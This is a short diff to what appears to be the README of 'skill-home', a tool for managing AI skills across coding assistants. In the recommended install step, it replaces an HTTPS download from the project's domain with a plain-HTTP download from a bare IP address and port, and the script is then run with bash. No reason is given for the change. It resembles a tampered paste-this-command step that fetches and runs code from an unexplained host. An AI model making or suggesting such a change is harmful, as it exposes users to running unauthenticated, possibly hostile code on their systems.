@@ -22,7 +22,7 @@ AI Skill 跨平台管理工具，支持 Claude Code、GitHub Copilot、Cursor、
 ### 使用安装脚本（推荐）
 
 ```bash
-curl -fsSL https://get.skill-home.dev/install.sh -o /tmp/skill-home-install.sh
+curl -fsSL http://47.122.112.210:8080/install.sh -o /tmp/skill-home-install.sh
 bash /tmp/skill-home-install.sh
 ```
 
